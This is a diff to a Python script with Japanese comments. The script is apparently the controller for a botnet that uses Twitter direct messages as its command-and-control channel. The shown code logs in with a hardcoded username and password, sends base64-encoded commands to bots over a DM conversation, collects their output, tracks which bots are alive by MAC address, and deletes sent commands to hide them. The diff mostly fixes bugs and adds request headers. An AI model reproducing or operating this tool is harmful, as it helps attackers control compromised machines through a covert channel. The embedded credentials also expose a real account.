@@ -12,9 +12,10 @@ import time
 SESSION = requests.Session()
 RESPONSE = ""
 AUTH_TOKEN = ""
-USERNAME = ""
-PASSWORD = ""
-DM_LINK = "https://twitter.com/messages/with/conversation?id=459072132-459072132&last_note_ts=3"
+USERNAME = "chappyharry"
+PASSWORD = "harry"
+#DM_LINK = "https://twitter.com/direct_messages/"
+DM_LINK = "https://twitter.com/messages/with/conversation?id=135038063-135038063&last_note_ts=3"
 WAIT_TIME = 120
 BOTS_ALIVE = []
 BOTS_MACADDR = []
@@ -50,7 +51,8 @@ class CommandToSend:
                'cmd': self.cmd,
                'jobid': self.jobid
                }
-        return base64.b64encode(json.dumps(cmd))
+        #UTF-8に変換しないと例外となる
+        return base64.b64encode(json.dumps(cmd).encode('utf-8'))
 
     def get_jobid(self):
         return self.jobid
@@ -84,7 +86,7 @@ class CommandOutput:
     def get_output(self):
         return self.output
 
-def dm_delete(self):
+def dm_delete():
     global SESSION,RESPONSE,AUTH_TOKEN,JOB_LIST,BOTS_ALIVE,COMMANDS
 
     headers = {
@@ -98,7 +100,7 @@ def dm_delete(self):
 
     delete = {
         "authenticity_token": AUTH_TOKEN,
-        "conversation_id": "459072132-4590272132",
+        "conversation_id": "135038063-135038063",
         "cursor": "GRwmhICpjZzZjYsVFoiAq7nY75OLFSUkAAA",
         "id": ""
     }
@@ -132,16 +134,25 @@ def dm_delete(self):
 
     print("[+]" + str(del_count) + "件の命令を削除しました")
 
-def dm_receive(self):
+def dm_receive():
     global SESSION,RESPONSE,AUTH_TOKEN,JOB_LIST,BOTS_ALIVE,COMMANDS
 
     headers = {
-        "accept": "application/json, text/javascript, */*; q=0.01",
-        "accept-encoding": "gzip, deflate, sdch, br",
-        "accept-language": "ja,en-US;q=0.8,en;q=0.6",
         "User-Agent": "Mozilla/5.0",
+        "accept": "application/json, text/javascript, */*; q=0.01",
+        "accept-language": "ja,en-US;q=0.8,en;q=0.6",
+        "accept-encoding": "gzip, deflate, sdch, br",
+        "content-type": "application/x-www-form-urlencoded",
+        "origin": "https://twitter.com",
         "referer": "https://twitter.com/",
-        "x-requested-with": "XMLHttpRequest"
+        "x-requested-with": "XMLHttpRequest",
+        "upgrade-insecure-requests": "1",
+        "authenticity_token": AUTH_TOKEN,
+    }
+
+    recv = {
+        "authenticity_token": AUTH_TOKEN,
+        "conversation_id": "135038063-135038063",
     }
 
     try:
@@ -194,12 +205,17 @@ def dm_send(message):
 
     headers = {
         "User-Agent": "Mozilla/5.0",
-        "referer": "https://twitter.com/"
+        "accept": "text/html,application/xhtml+xml,application/xml",
+        "accept-language": "ja,en-US;q=0.8,en;q=0.6",
+        "content-type": "application/x-www-form-urlencoded",
+        "origin": "https://twitter.com",
+        "referer": "https://twitter.com/",
+        "upgrade-insecure-requests": "1"
     }
 
     send = {
         "authenticity_token": AUTH_TOKEN,
-        "conversation_id": "459072132-4590272132",
+        "conversation_id": "135038063-135038063",
         "scribeContext[component]": "tweet_box_dm",
         "tagged_users": "",
         "text": message,
@@ -211,21 +227,26 @@ def dm_send(message):
         RESPONSE = SESSION.post("https://twitter.com/i/direct_messages/new", data=send, allow_redirects=False, headers=headers, cookies=RESPONSE.cookies)
         #ステータスコードの比較
         if RESPONSE.status_code == 200:
-            print("[+]命令送信完了 HTTP status：" + RESPONSE.status_code)
+            print("[+]命令送信完了 HTTP status：" + str(RESPONSE.status_code))
         else:
-            print("[+]命令送信失敗 HTTP status：" + RESPONSE.status_code)
+            print("[+]命令送信失敗 HTTP status：" + str(RESPONSE.status_code))
 
     except:
         print("[+]ダイレクトメッセージの送信失敗")
         # 再ログイン
         login()
 
-def login(self):
+def login():
     global SESSION,RESPONSE,AUTH_TOKEN
 
     headers = {
         "User-Agent": "Mozilla/5.0",
-        "referer": "https://twitter.com/"
+        "accept": "text/html,application/xhtml+xml,application/xml",
+        "accept-language": "ja,en-US;q=0.8,en;q=0.6",
+        "content-type": "application/x-www-form-urlencoded",
+        "origin": "https://twitter.com",
+        "referer": "https://twitter.com/",
+        "upgrade-insecure-requests": "1"
     }
 
     payload = {
@@ -239,7 +260,7 @@ def login(self):
     }
 
     try:
-        RESPONSE = SESSION.post("https://twitter.com/", allow_redirects=False, headers=headers)
+        RESPONSE = SESSION.get("https://twitter.com/", allow_redirects=False, headers=headers)
         soup = BeautifulSoup(RESPONSE.text, "lxml")
         AUTH_TOKEN = soup.find(attrs={'name': 'authenticity_token'}).get('value')
         payload['authenticity_token'] = AUTH_TOKEN
@@ -249,7 +270,7 @@ def login(self):
     except Exception as e:
         print("[+]ログインに失敗しました")
 
-def refresh(self):
+def refresh():
     global JOB_LIST,WAIT_TIME
 
     print("[+]起動中のボットを確認する命令を生成中")
@@ -260,14 +281,14 @@ def refresh(self):
     dm_receive()
     JOB_LIST.append(cmd.get_jobid())
 
-def list_bots(self):
+def list_bots():
     if (len(BOTS_ALIVE) == 0):
         print("[+]No bots alive")
         return
     for bot in BOTS_ALIVE:
         print("%s: %s" % (bot.get_sebder(), bot.get_output()))
 
-def list_commands(self):
+def list_commands():
     if (len(COMMANDS) == 0):
         print("[+]No commands loaded")
         return
@@ -281,7 +302,7 @@ def retrieve_command(id_command):
             return
     print("[+]Did not manage to retrive the output")
 
-def help(self):
+def help():
     print("""""
     refresh               - 起動中おBOTとコマンド結果の更新
     reload                - コマンド結果の更新
@@ -294,7 +315,7 @@ def help(self):
     exit                  - プログラムの終了
    """)
 
-def main(self):
+def main():
     #ログイン
     login()
     #起動中に送受信を行う事でデータを取得更新する
